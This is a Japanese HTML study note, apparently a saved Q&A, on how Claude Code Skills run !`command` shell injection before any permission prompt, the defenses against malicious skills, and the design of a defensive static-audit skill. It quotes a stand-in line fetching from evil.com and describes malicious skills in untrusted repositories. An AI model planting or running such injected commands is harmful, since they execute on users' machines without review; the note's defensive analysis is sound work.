@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Skill のシェルインジェクションと監査スキル（audit-skill）</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+JP:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+  :root { --ink:#1a1a1a; --sub:#6b6b6b; --line:#e6e6e6; --accent:#2f7d6b; --bg:#ffffff; --note:#f4f4f4; }
+  * { box-sizing:border-box; }
+  body { margin:0; background:var(--bg); color:var(--ink);
+    font-family:"Noto Sans JP", -apple-system, BlinkMacSystemFont, "Hiragino Kaku Gothic ProN", sans-serif;
+    line-height:1.9; font-size:16px; }
+  main { max-width:720px; margin:0 auto; padding:48px 24px 120px; }
+  .back { font-size:.85rem; color:var(--accent); text-decoration:none; }
+  .back:hover { text-decoration:underline; }
+  .kind { color:var(--sub); font-size:.82rem; margin:12px 0 4px; }
+  h1 { font-size:1.6rem; font-weight:700; line-height:1.5; margin:4px 0 24px; }
+  h2 { font-size:1.25rem; font-weight:700; margin:52px 0 14px; padding-bottom:8px; border-bottom:2px solid var(--accent); }
+  h3 { font-size:1.0rem; font-weight:700; margin:28px 0 6px; }
+  p, li { color:var(--ink); }
+  strong { font-weight:700; }
+  code { background:var(--note); padding:2px 6px; border-radius:4px; font-size:.88em;
+    font-family:ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
+  pre { background:#f7f7f7; border:1px solid var(--line); border-radius:8px; padding:16px; overflow-x:auto; line-height:1.6; }
+  pre code { background:none; padding:0; }
+  blockquote { margin:0 0 24px; padding:12px 16px; background:var(--note); border-left:3px solid var(--accent);
+    color:var(--sub); font-size:.9rem; border-radius:0 6px 6px 0; }
+  blockquote a { color:var(--accent); }
+  .qa { font-weight:700; margin:24px 0 4px; }
+  table { border-collapse:collapse; width:100%; margin:16px 0; font-size:.92rem; }
+  th, td { border:1px solid var(--line); padding:8px 12px; text-align:left; vertical-align:top; }
+  th { background:var(--note); font-weight:700; }
+  ul, ol { padding-left:1.4em; }
+  li { margin-bottom:6px; }
+  hr { border:none; border-top:1px solid var(--line); margin:48px 0; }
+  footer { color:var(--sub); font-size:.8rem; margin-top:56px; }
+</style>
+</head>
+<body>
+<main>
+  <a class="back" href="../index.html">← 02-skills-deep-dive に戻る</a>
+  <p class="kind">種別: ユーザー議論・Q&amp;A の記録（Phase 3 / トピック 02-skills-deep-dive）</p>
+  <h1>Skill のシェルインジェクションと監査スキル（audit-skill）</h1>
+  <blockquote>
+    関連トピック: <a href="../index.md">02-skills-deep-dive/index.md</a>（<a href="../index.html">HTML</a>）
+  </blockquote>
+
+  <h2>論点</h2>
+  <p>Skills の「ダイナミックコンテキストインジェクション」<code>!`command`</code> は、Claude が本文を読む前にシェルを実行する前処理である。ここから「悪意あるスキルに <code>!`wget evil.com`</code> のような破壊的コマンドが仕込めるのでは？」という疑問が生まれ、(1) 実際にそれが可能か、(2) どう防ぐか、(3) 危険なスキルを見分ける手段はあるか、を議論した。最終的に「危険スキルを静的監査する自作スキル <code>audit-skill</code>」を設計・実装・テストするところまで進めた。</p>
+
+  <h2>Q&amp;A</h2>
+
+  <p class="qa">Q1: <code>${CLAUDE_SESSION_ID}</code> のような変数は、ダイナミックコンテキストインジェクションのこと？</p>
+  <p>別物。どちらも「Claude が本文を読む前に埋め込まれる前処理」という共通点があるため紛らわしいが、仕組みが違う。</p>
+  <ul>
+    <li><strong>文字列置換</strong>（<code>$ARGUMENTS</code> / <code>$0</code> / <code>${CLAUDE_SESSION_ID}</code> / <code>${CLAUDE_SKILL_DIR}</code>）= 既知の値に差し替えるテンプレート展開。<strong>コマンドは実行しない</strong>。</li>
+    <li><strong>ダイナミックコンテキストインジェクション</strong>（<code>!`command`</code>）= シェルコマンドを<strong>実際に実行して、その標準出力</strong>を本文に注入する。</li>
+  </ul>
+  <p>「値の差し込み（静的）」か「コマンド実行結果の差し込み（動的）」かが分かれ目。両者とも SKILL.md レンダリング時にだけ解決される機能で、<strong>素のシェルの環境変数ではない</strong>（普通のターミナルで <code>echo ${CLAUDE_SESSION_ID}</code> しても空）。</p>
+
+  <p class="qa">Q2: 変なスキルに <code>!`wget evil.com`</code> とか書いてあって実行されることがある？</p>
+  <p>ある。そして公式 docs も明確に警告している。重要なのは「Claude が判断して実行」ではない点。普通の Bash 実行は「Claude がツールを呼ぶ → permission 判定」を通るが、ダイナミックインジェクションは <strong>Claude Code が前処理として実行</strong>してしまう（"Each <code>!`&lt;command&gt;`</code> executes immediately (before Claude sees anything)" / "This is preprocessing, not something Claude executes."）。つまり <strong>per-command の permission プロンプトが挟まらない</strong>。</p>
+  <p>防御は3層：</p>
+  <ol>
+    <li><strong>ワークスペース信頼ダイアログ（最重要の関門）</strong>: project の <code>.claude/skills/</code> のスキル（と <code>allowed-tools</code>）は、ワークスペースを信頼してからでないと有効化されない。docs は "Review project skills before trusting a repository" と明記。</li>
+    <li><strong><code>disableSkillShellExecution: true</code>（キルスイッチ）</strong>: user/project/plugin 由来の <code>!`command`</code> を一律無効化し、<code>[shell command execution disabled by policy]</code> に置換。<strong>bundled / managed は対象外</strong>。managed settings に入れればユーザーは解除できない。</li>
+    <li><strong>信頼ティア</strong>: bundled / managed は信頼済みでキルスイッチ対象外。user / project / plugin は制御対象。「外から来たものほど縛れる」設計。</li>
+  </ol>
+  <p>実行タイミングは <strong>invoke（本文ロード）時</strong>で、セッション開始時ではない（開始時に乗るのは説明文だけ）。ただし自動起動可なら Claude が呼んで発火し得るので、人間の関門（信頼ダイアログ・中身確認）が効く。</p>
+
+  <p class="qa">Q3: <code>/skill-name:fork</code> のように呼べば fork 実行になる？</p>
+  <p>ならない。<code>context: fork</code> は「呼ぶときのオプション」ではなく「Skill 側のフロントマターに焼き込む性質」。使う側は普通に <code>/skill-name</code> と打つだけで、定義により自動的に subagent として走る。また <code>/a:b</code> の <code>:</code> は <strong>プラグインの名前空間</strong>（plugin:skill）なので、<code>/skill-name:fork</code> は「<code>skill-name</code> プラグインの <code>fork</code> スキル」という別物になる。</p>
+
+  <p class="qa">Q4: <code>agent: Explore</code> などの値は何？プリセットの context？</p>
+  <p>正確には「プリセットの subagent タイプ（職種テンプレ）」。プリセットされているのは context の中身（記憶）ではなく、<strong>システムプロンプト（人格）＋使えるツール（権限）＋役割</strong>。context window 自体は subagent なので毎回別枠で立つ。</p>
+  <table>
+    <tr><th>タイプ</th><th>役割</th><th>書き込み</th></tr>
+    <tr><td>Explore</td><td>調査屋。多数ファイル横断で「どこに何があるか」</td><td>❌ 読み取り専用</td></tr>
+    <tr><td>Plan</td><td>設計屋。実装方針・トレードオフ</td><td>❌ 読み取り専用</td></tr>
+    <tr><td>general-purpose</td><td>何でも屋</td><td>✅ 全ツール</td></tr>
+  </table>
+  <p><code>agent:</code> には自作カスタム subagent も指定できる。</p>
+
+  <p class="qa">Q5: 危険なスキルを見分けるスキルは無いの？</p>
+  <p>専用の「危険スキル検出スキル」は（公式には）見当たらない。近いのは <code>/security-review</code>（差分のレビュー）・ワークスペース信頼ダイアログ・<code>disableSkillShellExecution</code>。いずれも「人間の信頼判断 ＋ 全面キルスイッチ」が中心で、"危険度を見分ける" は手薄。→ ここに自作の余地があり、<code>audit-skill</code> を作った。</p>
+
+  <h2>結論 / 整理</h2>
+  <ul>
+    <li>インジェクション = <strong>コマンド実行の注入</strong>、置換 = <strong>値の差し込み</strong>。混同しない。</li>
+    <li>インジェクションは <strong>permission を経ずに前処理として走る</strong>。防御の中心は「実行時の許可」ではなく <strong>「信頼ダイアログ（人間の関門）＋ disableSkillShellExecution」</strong>。</li>
+    <li>これは Phase 2 の「<code>autoMemoryDirectory</code> がなぜ user 限定か（clone した悪意リポが project settings を仕込む攻撃）」と同じ穴 = <strong>「プロジェクト由来の設定は、信頼していないリポでは攻撃面になる」</strong> という Claude Code 全体の思想。</li>
+    <li>監査スキルの設計原則（実装で得た学び）:
+      <ul>
+        <li><strong>読むだけ（Read/Grep）・対象を invoke しない</strong>。テキスト読みなら注入は発火しないので静的スキャンは安全。</li>
+        <li>危ない「読む」工程だけ <strong>Explore subagent に隔離</strong>（丸ごと fork せず危険工程だけ隔離するコンテキスト工学の応用）。</li>
+        <li>監査スキル自身が<strong>自己発火しない</strong>よう、注入例を生の <code>!`...`</code> で書かず英文説明に置換する。</li>
+        <li><code>allowed-tools</code> は <code>Bash(*)</code> のような広すぎ指定を避け、必要な操作だけ狭く事前承認（自分が監査で減点されない作り）。</li>
+      </ul>
+    </li>
+  </ul>
+
+  <h2>比較表 / 具体例</h2>
+  <h3>文字列置換 vs ダイナミックコンテキストインジェクション</h3>
+  <table>
+    <tr><th></th><th>文字列置換</th><th>ダイナミックインジェクション</th></tr>
+    <tr><td>構文</td><td><code>$ARGUMENTS</code> <code>${CLAUDE_SESSION_ID}</code> <code>${CLAUDE_SKILL_DIR}</code></td><td><code>!`command`</code></td></tr>
+    <tr><td>何が起きる</td><td>既知の値に差し替え</td><td>シェル実行して stdout を注入</td></tr>
+    <tr><td>permission</td><td>—</td><td><strong>挟まらない（前処理で実行）</strong></td></tr>
+    <tr><td>実行タイミング</td><td>レンダリング時</td><td>レンダリング（invoke）時</td></tr>
+  </table>
+
+  <h3>audit-skill v1 の設計（実装した形）</h3>
+  <ul>
+    <li>置き場所: <code>.claude/skills/audit-skill/SKILL.md</code>（project スコープ、<strong>大文字 SKILL.md</strong>）</li>
+    <li>フロントマター: <code>disable-model-invocation: true</code>（手動 <code>/audit-skill</code> 専用）、<code>argument-hint</code>、<code>allowed-tools</code> は <code>Write</code> / <code>Bash(mkdir -p *)</code> / <code>Bash(python3 -m http.server *)</code> / <code>Bash(open http://localhost:*)</code> を狭く事前承認、<code>model</code> は付けない（opus 固定はコストの罠＝復習キュー Q5）</li>
+    <li>本文: 安全規約（読むだけ・invoke 禁止・理由）→ 入力解決（<code>$ARGUMENTS</code>）→ <strong>Explore subagent で読む・解析</strong> → 日本語レポート（重大度つき）→ 出力3モード（md / html / localhost）。出力は日本語固定。</li>
+    <li><code>--html:localhost</code>: note 風 HTML を <code>audit-reports/&lt;name&gt;.html</code> に書き出し、<code>127.0.0.1</code> バインドで <code>audit-reports/</code> のみ配信、ブラウザを開く（サーバ起動は副作用と本文に注記）。</li>
+  </ul>
+
+  <h2>よくある誤解</h2>
+  <ul>
+    <li><strong>誤解: <code>${CLAUDE_SESSION_ID}</code> は普通のシェル環境変数。</strong> 実際: SKILL.md レンダリング時のみ展開。素のシェルでは空。</li>
+    <li><strong>誤解: <code>!`cmd`</code> は Claude が判断してから実行する。</strong> 実際: Claude Code が前処理として permission 無しで実行する。</li>
+    <li><strong>誤解: <code>/skill-name:fork</code> のように打てば fork できる。</strong> 実際: <code>context: fork</code> はフロントマターに焼き込む性質。<code>:</code> はプラグイン名前空間。</li>
+    <li><strong>誤解: 監査スキルは安全（読むだけ）だから何でも実行してよい。</strong> 実際: 監査スキル自身も注入例を生で書くと invoke 時に自己発火し得る。生の <code>!`...`</code> を本文に置かない。</li>
+  </ul>
+
+  <h2>参考文献</h2>
+  <ul>
+    <li><a href="https://code.claude.com/docs/en/skills#inject-dynamic-context">Extend Claude with skills — Inject dynamic context / Pre-approve tools for a skill</a> - <code>!`command`</code> の実行タイミング、<code>disableSkillShellExecution</code>、信頼ダイアログ（閲覧日 2026-06-19）</li>
+    <li><a href="https://code.claude.com/docs/en/hooks">Claude Code Hooks reference</a> - 全 hook イベント一覧（プラグイン install/reload 用イベントは無い、ConfigChange の matcher に skills、SessionStart の matcher）（閲覧日 2026-06-19）</li>
+    <li><a href="https://code.claude.com/docs/en/features-overview">Extend Claude Code — Hook vs Skill（強制 vs 推論任せ）</a> - 「お願い（CLAUDE.md/Skill）」と「強制（Hook）」の対比（閲覧日 2026-06-19）</li>
+  </ul>
+
+  <hr>
+  <footer>Saved at 2026-06-19 via /learning-flow:reference ・ <a class="back" href="../index.html">← 02-skills-deep-dive に戻る</a></footer>
+</main>
+</body>
+</html>
